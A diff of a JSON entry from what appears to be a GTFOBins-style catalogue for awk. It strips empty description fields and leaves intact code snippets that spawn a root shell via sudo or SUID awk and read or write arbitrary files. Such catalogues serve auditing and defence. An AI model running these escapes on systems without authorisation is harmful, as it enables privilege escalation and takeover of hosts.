@@ -2,7 +2,7 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "awk 'BEGIN {system(\"/bin/sh\")}'\n"
       }
     ],
@@ -20,31 +20,31 @@
     ],
     "file-write": [
       {
-        "description": "",
+        
         "code": "LFILE=file_to_write\nawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n"
       }
     ],
     "file-read": [
       {
-        "description": "",
+        
         "code": "LFILE=file_to_read\nawk '//' \"$LFILE\"\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "LFILE=file_to_read\n./awk '//' \"$LFILE\"\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo awk 'BEGIN {system(\"/bin/sh\")}'\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./awk 'BEGIN {system(\"/bin/sh\")}'\n"
       }
     ]
